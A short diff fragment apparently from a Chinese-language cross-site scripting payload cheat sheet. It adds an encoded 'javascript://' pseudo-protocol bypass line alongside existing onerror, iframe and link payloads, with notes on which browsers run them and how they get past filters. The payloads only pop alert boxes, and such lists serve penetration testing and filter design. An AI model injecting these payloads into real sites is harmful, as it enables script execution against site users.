@@ -17,6 +17,8 @@
 <audio src=x onerror=confirm("casrc")> 
 
 伪协议：
+javascript://comment％250aalert(1)
+
 <iframe src="javascript:alert(111)"></iframe>  //火狐/IE/谷歌都支持
 <a href="javascript:alert(111)">aaa</a>
 如果在a标签中可以用伪协议绕过。
